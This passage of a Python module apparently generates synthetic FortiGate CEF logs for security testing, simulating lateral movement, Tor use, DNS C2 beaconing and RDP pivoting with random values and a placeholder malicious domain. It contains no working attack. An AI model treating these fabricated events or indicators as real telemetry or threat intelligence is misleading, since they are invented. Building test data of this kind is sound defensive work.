            "FTNTFGTsrccountry":       "Reserved",
            "FTNTFGTdstcountry":       "Reserved",
            "FTNTFGTduration":         0,
            "out":                     random.randint(40, 200),
            "in":                      random.randint(40, 200),
            "FTNTFGTsentpkt":          1,
            "FTNTFGTrcvdpkt":          0,
            "FTNTFGTosname":           random.choice(_SRC_OS_WINDOWS),
            "FTNTFGTsrcmac":           _random_mac(),
            "externalId":              _session_id(),
            "outcome":                 "success",
            "msg":                     f"SMB probe {src_ip} → {dst_ip}:445 (share enumeration)",
        }
        logs.append(_format_fortinet_cef(config, "0000000013", "traffic", "forward", "notice", fields))
    return logs


def _simulate_lateral_movement(config, src_ip, user, shost):
    """
    East-west traffic from one internal host to multiple internal servers.
    Returns list of log strings.
    """
    print(f"    - Fortinet Module simulating: Lateral movement from {src_ip}")
    forti_conf   = _get_config(config)
    servers      = config.get("internal_servers", ["10.0.10.50", "10.0.10.51", "10.0.10.52"])
    targets      = random.sample(servers, k=min(random.randint(3, 6), len(servers)))
    lateral_port = random.choice([445, 22, 3389, 5985, 1433, 8080])
    lan_iface    = forti_conf.get("interface_lan", "port10")
    logs         = []

    for dst_ip in targets:
        act   = random.choices(["accept", "deny"], weights=[70, 30])[0]
        fields = {
            "src":                      src_ip,
            "spt":                      random.randint(49152, 65535),
            "shost":                    shost or src_ip,
            "suser":                    user,
            "dst":                      dst_ip,
            "dpt":                      lateral_port,
            "proto":                    "6",
            "act":                      act,
            "app":                      {445: "SMB", 22: "SSH", 3389: "RDP",
                                         5985: "WinRM", 1433: "MSSQL", 8080: "HTTP"}.get(lateral_port, "TCP"),
            "deviceInboundInterface":   lan_iface,
            "deviceOutboundInterface":  lan_iface,
            "FTNTFGTpolicyid":          forti_conf.get("default_policy_id", "1"),
            "FTNTFGTpolicyname":        forti_conf.get("default_policy_name", "allow-outbound"),
            "FTNTFGTsrccountry":        "Reserved",
            "FTNTFGTdstcountry":        "Reserved",
            "FTNTFGTduration":          random.randint(0, 30),
            "out":                      random.randint(1000, 50000),
            "in":                       random.randint(500, 20000),
            "FTNTFGTsentpkt":           random.randint(5, 50),
            "FTNTFGTrcvdpkt":           random.randint(3, 30),
            "FTNTFGTosname":            random.choice(_SRC_OS_WINDOWS),
            "FTNTFGTsrcmac":            _random_mac(),
            "externalId":               _session_id(),
            "outcome":                  "success" if act == "accept" else "failed",
            "msg":                      f"Lateral {act} to {dst_ip}:{lateral_port}",
        }
        logs.append(_format_fortinet_cef(
            config,
            "0000000013" if act == "accept" else "0000000014",
            "traffic", "forward",
            "notice" if act == "accept" else "warning",
            fields
        ))
    return logs


def _simulate_tor_connection(config, src_ip, user, shost):
    """Internal host connecting to Tor exit node — traffic:forward allow."""
    print(f"    - Fortinet Module simulating: Tor connection from {src_ip}")
    forti_conf = _get_config(config)
    tor_nodes  = forti_conf.get("tor_exit_nodes", ["198.51.100.77"])
    tor_ip     = random.choice(tor_nodes)
    tor_port  = random.choices([443, 9001, 9030], weights=[60, 30, 10])[0]
    duration_s = random.randint(60, 3600)

    fields = _base_traffic_fields(
        config, src_ip, shost, user, tor_ip, None, "6", tor_port, "accept",
        duration_s=duration_s, dst_country="Reserved"
    )
    fields.update({
        "app":              "Tor" if tor_port != 443 else "HTTPS",
        "FTNTFGTapp":       "Tor.Browser",
        "FTNTFGTappid":     16390,
        "FTNTFGTappcat":    "Proxy",
        "FTNTFGTapprisk":   "critical",
        "FTNTFGTapplist":   _get_config(config).get("applist", "g-default"),
        "FTNTFGTdstcountry": "Reserved",
        "msg":              f"Connection to Tor exit node {tor_ip}:{tor_port}",
    })
    return _format_fortinet_cef(config, "0000000013", "traffic", "forward", "warning", fields)


def _simulate_dns_c2_beacon(config, src_ip, user, shost):
    """
    DNS beaconing to suspected C2 resolver — repeated queries (returns list).
    Signal: regularity and volume of DNS queries to same suspicious resolver.
    """
    print(f"    - Fortinet Module simulating: DNS C2 beacon from {src_ip}")
    forti_conf   = _get_config(config)
    dga_domains  = forti_conf.get("dga_beacon_domains",
                                   forti_conf.get("malicious_dns_domains", ["asdfqwerlkj.info"]))
    resolver     = _random_external_ip()
    query_count  = random.randint(15, 40)
    logs         = []
    base_domain  = random.choice(dga_domains)

    for _ in range(query_count):
        # Each beacon uses a DGA subdomain of the same C2 domain
        subdomain = f"{uuid.uuid4().hex[:8]}.{base_domain}"
        qtype     = random.choices(["A", "TXT", "MX"], weights=[50, 35, 15])[0]
        fields    = {
            "src":              src_ip,
            "spt":              random.randint(49152, 65535),
            "shost":            shost or src_ip,
            "suser":            user,
            "dst":              resolver,
            "dpt":              53,
            "proto":            "17",
            "act":              "passthrough",
            "app":              "DNS",
            "FTNTFGTeventtype": "dns-query",
            "FTNTFGTqname":     subdomain,
            "FTNTFGTqtype":     qtype,
            "FTNTFGTqclass":    "IN",
            "FTNTFGTpolicyid":  forti_conf.get("default_policy_id", "1"),
            "FTNTFGTpolicyname": forti_conf.get("default_policy_name", "allow-outbound"),
            "FTNTFGTsrccountry":"Reserved",
            "FTNTFGTdstcountry": random.choice(_EXT_LOCATIONS)["country"],
            "FTNTFGTduration":  0,
            "out":              random.randint(50, 100),
            "in":               random.randint(50, 150),
            "FTNTFGTsentpkt":   1,
            "FTNTFGTrcvdpkt":   1,
            "FTNTFGTosname":    random.choice(_SRC_OS_WINDOWS),
            "FTNTFGTsrcmac":    _random_mac(),
            "externalId":       _session_id(),
            "outcome":          "success",
            "msg":              f"DNS query for suspicious domain {subdomain}",
        }
        logs.append(_format_fortinet_cef(config, "1501054802", "utm", "dns", "warning", fields))
    return logs


def _simulate_server_outbound_http(config):
    """
    Internal server making unexpected outbound HTTP — anomalous signal.
    Server process shouldn't initiate external web connections.
    """
    print(f"    - Fortinet Module simulating: Server outbound HTTP")
    servers     = config.get("internal_servers", ["10.0.10.50"])
    src_ip      = random.choice(servers)
    dst_ip      = _random_external_ip()
    geo         = _ext_geo()
    duration_s  = random.randint(5, 120)

    fields = _base_traffic_fields(
        config, src_ip, None, "N/A", dst_ip, None, "6", 80, "accept",
        duration_s=duration_s, dst_country=geo["country"],
        src_os=random.choice(_SRC_OS_SERVER)
    )
    fields.update({
        "app":              "HTTP",
        "FTNTFGTapp":       "HTTP",
        "FTNTFGTappid":     15893,
        "FTNTFGTappcat":    "Network.Service",
        "FTNTFGTapprisk":   "medium",
        "FTNTFGTsrccountry": "Reserved",
        "FTNTFGTdstcountry": geo["country"],
        "FTNTFGTdstcity":   geo["city"],
        "FTNTFGTdstosname": "Unknown",
        "FTNTFGThttpmethod":"GET",
        "requestClientApplication": random.choice(_SUSPICIOUS_UA),
        "msg":              f"Anomalous outbound HTTP from internal server {src_ip}",
    })
    return _format_fortinet_cef(config, "0000000013", "traffic", "forward", "warning", fields)


def _simulate_rdp_lateral(config, src_ip, user, shost, session_context=None):
    """
    Workstation-to-workstation or workstation-to-server RDP — lateral movement signal.
    """
    print(f"    - Fortinet Module simulating: RDP lateral movement from {src_ip}")
    forti_conf = _get_config(config)
    lan_iface  = forti_conf.get("interface_lan", "port10")

    # Try to find a second workstation via session context
    dst_ip = None
    if session_context:
        peer = get_random_user(session_context, preferred_device_type="workstation")
        if peer and peer.get("ip") and peer["ip"] != src_ip:
            dst_ip = peer["ip"]
    if not dst_ip:
        servers = config.get("internal_servers", ["10.0.10.51"])
        dst_ip  = random.choice([s for s in servers if s != src_ip] or servers)

    act    = random.choices(["accept", "deny"], weights=[65, 35])[0]
    fields = {
        "src":                      src_ip,
        "spt":                      random.randint(49152, 65535),
        "shost":                    shost or src_ip,
        "suser":                    user,
        "dst":                      dst_ip,
        "dpt":                      3389,
        "proto":                    "6",
        "act":                      act,
        "app":                      "RDP",
        "deviceInboundInterface":   lan_iface,
        "deviceOutboundInterface":  lan_iface,
        "FTNTFGTpolicyid":          forti_conf.get("default_policy_id", "1"),
        "FTNTFGTpolicyname":        forti_conf.get("default_policy_name", "allow-outbound"),
        "FTNTFGTsrccountry":        "Reserved",
        "FTNTFGTdstcountry":        "Reserved",
        "FTNTFGTduration":          random.randint(10, 3600) if act == "accept" else 0,
        "out":                      random.randint(5000, 500000) if act == "accept" else 0,
        "in":                       random.randint(10000, 1000000) if act == "accept" else 0,
        "FTNTFGTsentpkt":           random.randint(10, 1000) if act == "accept" else 1,
        "FTNTFGTrcvdpkt":           random.randint(20, 2000) if act == "accept" else 0,
        "FTNTFGTosname":            random.choice(_SRC_OS_WINDOWS),
        "FTNTFGTdstosname":         random.choice(_SRC_OS_WINDOWS),
        "FTNTFGTsrcmac":            _random_mac(),
        "externalId":               _session_id(),
        "outcome":                  "success" if act == "accept" else "failed",
        "msg":                      f"RDP {act} from {src_ip} to {dst_ip}:3389",
    }
    return _format_fortinet_cef(
        config,
        "0000000013" if act == "accept" else "0000000014",
        "traffic", "forward",
        "notice" if act == "accept" else "warning",
        fields
    )


def _simulate_app_control_block(config, src_ip, user, shost):
    """Outbound connection blocked by application control policy — utm:app-ctrl."""
    print(f"    - Fortinet Module simulating: App control block from {src_ip}")
    forti_conf  = _get_config(config)
    app_entry   = random.choice(_APP_CONTROL_BLOCKS)
    dst_ip      = _random_external_ip()
    geo         = _ext_geo()
    dpt         = random.choice([443, 80, 8080, 6881, 9001])

    fields = _base_traffic_fields(
        config, src_ip, shost, user, dst_ip, None, "6", dpt, "blocked",
        dst_country=geo["country"]
    )
    fields.update({
        "app":              app_entry["app"],
        "FTNTFGTapp":       app_entry["app"],
        "FTNTFGTappid":     app_entry["appid"],
        "FTNTFGTappcat":    app_entry["category"],
        "FTNTFGTapprisk":   app_entry["risk"],
        "FTNTFGTapplist":   forti_conf.get("applist", "g-default"),
        "FTNTFGTprofile":   forti_conf.get("app_ctrl_profile", "default-app-ctrl"),
        "act":              "blocked",
        "FTNTFGTutmaction": "blocked",
        "FTNTFGTdstcountry": geo["country"],
        "FTNTFGTdstcity":   geo["city"],
        "outcome":          "failed",
        "msg":              f"Application {app_entry['app']} blocked by policy (risk: {app_entry['risk']})",
    })
    return _format_fortinet_cef(config, "1059028992", "utm", "app-ctrl", "warning", fields)


# ---------------------------------------------------------------------------
# Threat log dispatcher
# ---------------------------------------------------------------------------

def _generate_threat_log(config, session_context=None):
    """
    Dispatches a threat event based on event_mix.threat weights or hardcoded defaults.
    Multi-event generators (port_scan, auth_brute_force, etc.) return lists.
    """
    forti_conf = _get_config(config)
    event_mix  = forti_conf.get("event_mix", {})
    threat_cfg = event_mix.get("threat", [])

    if threat_cfg:
        events  = [e["event"]  for e in threat_cfg]
        weights = [e["weight"] for e in threat_cfg]
    else:  # Fallback: use module-level defaults
        events  = [e["event"]  for e in _DEFAULT_THREAT_EVENTS]
        weights = [e["weight"] for e in _DEFAULT_THREAT_EVENTS]

    chosen = random.choices(events, weights=weights, k=1)[0]

    # --- Multi-event generators — return (list, event_name) ---
    if chosen == "port_scan":
        user_info = get_random_user(session_context, preferred_device_type="workstation") if session_context else None
        if user_info:
            return (_simulate_port_scan(config, user_info["ip"], user_info["username"], user_info.get("hostname")), chosen)
        return (_simulate_port_scan(config, "192.168.1.100", "unknown", None), chosen)

    if chosen == "auth_brute_force":
        return (_simulate_auth_brute_force(config), chosen)

    if chosen == "vpn_brute_force":
        return (_simulate_vpn_brute_force(config), chosen)

    if chosen == "vpn_impossible_travel":
        return (_simulate_vpn_impossible_travel(config, session_context), chosen)

    if chosen == "vpn_tor_login":
        return (_simulate_vpn_tor_login(config, session_context), chosen)

    if chosen == "lateral_movement":
        user_info = get_random_user(session_context, preferred_device_type="workstation") if session_context else None
        if user_info:
            return (_simulate_lateral_movement(config, user_info["ip"], user_info["username"],
                                              user_info.get("hostname")), chosen)
        src = random.choice(config.get("internal_servers", ["192.168.1.100"]))
        return (_simulate_lateral_movement(config, src, "unknown", None), chosen)

    if chosen == "dns_c2_beacon":
        user_info = get_random_user(session_context, preferred_device_type="workstation") if session_context else None
        if user_info:
            return (_simulate_dns_c2_beacon(config, user_info["ip"], user_info["username"], user_info.get("hostname")), chosen)
        return (_simulate_dns_c2_beacon(config, "192.168.1.100", "unknown", None), chosen)

    if chosen == "smb_new_host_lateral":
        user_info = get_random_user(session_context, preferred_device_type="workstation") if session_context else None
        if user_info:
            return (_simulate_smb_new_host_lateral(config, user_info["ip"], user_info["username"],
                                                   user_info.get("hostname"), session_context), chosen)
        return (_simulate_smb_new_host_lateral(config, "192.168.1.100", "unknown", None), chosen)

    if chosen == "smb_share_enumeration":
        user_info = get_random_user(session_context, preferred_device_type="workstation") if session_context else None
        if user_info:
            return (_simulate_smb_share_enumeration(config, user_info["ip"], user_info["username"],
                                                    user_info.get("hostname")), chosen)
        return (_simulate_smb_share_enumeration(config, "192.168.1.100", "unknown", None), chosen)

    # --- Single-event generators — resolve user/IP then dispatch ---
    user, src_ip, shost = "unknown", "192.168.1.100", None
    if session_context:
        user_info = get_random_user(session_context, preferred_device_type="workstation")
        if user_info:
            user   = user_info["username"]
            src_ip = user_info["ip"]
            shost  = user_info.get("hostname")
    else:
        umap = (forti_conf.get("user_ip_map") or config.get('shared_user_ip_map', {}))
        if umap:
            user, src_ip = random.choice(list(umap.items()))
            shost = _get_user_and_host_info(config, src_ip)[1]

    if chosen == "ips":
        return (_simulate_ips_attack(config), chosen)
    elif chosen == "antivirus":
        return (_simulate_antivirus(config, src_ip, user, shost), chosen)
    elif chosen == "webfilter_block":
        return (_simulate_webfilter_block(config, src_ip, user, shost), chosen)
    elif chosen == "large_upload":
        return (_simulate_large_upload(config, src_ip, user, shost), chosen)
    elif chosen == "waf_attack":
        return (_simulate_waf_attack(config, src_ip, user, shost), chosen)
    elif chosen == "tor_connection":
        return (_simulate_tor_connection(config, src_ip, user, shost), chosen)
    elif chosen == "server_outbound_http":
        return (_simulate_server_outbound_http(config), chosen)
    elif chosen == "rdp_lateral":
        return (_simulate_rdp_lateral(config, src_ip, user, shost, session_context), chosen)
    elif chosen == "app_control_block":
        return (_simulate_app_control_block(config, src_ip, user, shost), chosen)
    elif chosen == "smb_rare_file_transfer":
        return (_simulate_smb_rare_file_transfer(config, src_ip, user, shost), chosen)
    else:
        return (_simulate_ips_attack(config), chosen)


# ---------------------------------------------------------------------------
# Scenario handler
# ---------------------------------------------------------------------------

def _generate_scenario_log(config, scenario):
    """Generates a specific CEF log for an orchestrator scenario."""
    print(f"    - Fortinet Module creating scenario log: {scenario.get('name', 'Unknown')}")
    user, shost  = _get_user_and_host_info(config, scenario.get("source_ip"))
    src_ip       = scenario.get("source_ip", "192.168.1.100")
    dst_ip       = scenario.get("dest_ip", _random_external_ip())
    dpt          = scenario.get("dest_port", 443)
    act          = scenario.get("action", "accept")
    domain       = scenario.get("dest_domain", dst_ip)
    log_type     = scenario.get("log_type", "traffic")

    fields = _base_traffic_fields(config, src_ip, shost, user, dst_ip, domain, "6", dpt, act)

    if log_type == "ips":
        fields.update({
            "FTNTFGTattack":    scenario.get("threat_name", "Scenario.Threat"),
            "FTNTFGTattackid":  str(random.randint(90000000, 99999999)),
            "FTNTFGTseverity":  "high",
            "FTNTFGTCRlevel":   "high",
            "msg":              f"Scenario IPS event: {scenario.get('threat_name', 'Scenario.Threat')}",
        })
        return _format_fortinet_cef(config, "0419016384", "utm", "ips", "alert", fields)
    elif log_type == "webfilter":
        fields.update({
            "hostname": domain,
            "cat":      str(random.choice(_URL_CAT_BLOCKED)),
            "msg":      f"Scenario webfilter event for {domain}",
        })
        return _format_fortinet_cef(config, "0201008192", "utm", "webfilter", "warning", fields)
    elif log_type == "large_egress":
        fields["out"] = random.randint(100 * 1024 * 1024, 500 * 1024 * 1024)
        fields["msg"] = f"Scenario large egress to {domain}"
        return _format_fortinet_cef(config, "0000000013", "traffic", "forward", "warning", fields)
    else:  # traffic
        return _format_fortinet_cef(config, "0000000013", "traffic", "forward", "notice", fields)


# ---------------------------------------------------------------------------
# Main entry point
# ---------------------------------------------------------------------------

def generate_log(config, scenario=None, threat_level="Realistic", benign_only=False, context=None, scenario_event=None):
    """
    Main log generation function for Fortinet FortiGate.

    Returns a single log string OR a list of log strings (for multi-event scenarios).
    """
    global last_threat_event_time
    session_context = (context or {}).get("session_context")

    # Orchestrator scenario override
    if scenario:
        scenario_event = scenario if isinstance(scenario, str) else scenario.get("name", "")
        if scenario_event == "LARGE_EGRESS":
            return _simulate_large_upload(
                config,
                random.choice(config.get("internal_servers", ["192.168.1.100"])),
                "svc_account", None
            )
        return _generate_scenario_log(config, scenario if isinstance(scenario, dict) else {})

    if benign_only:
        return _generate_benign_log(config, session_context)

    interval     = _get_threat_interval(threat_level, config)
    current_time = time.time()

    if threat_level == "Insane" and random.random() < 0.8:
        return _generate_threat_log(config, session_context)

    if interval > 0 and (current_time - last_threat_event_time) > interval:
        last_threat_event_time = current_time
        return _generate_threat_log(config, session_context)

    return _generate_benign_log(config, session_context)
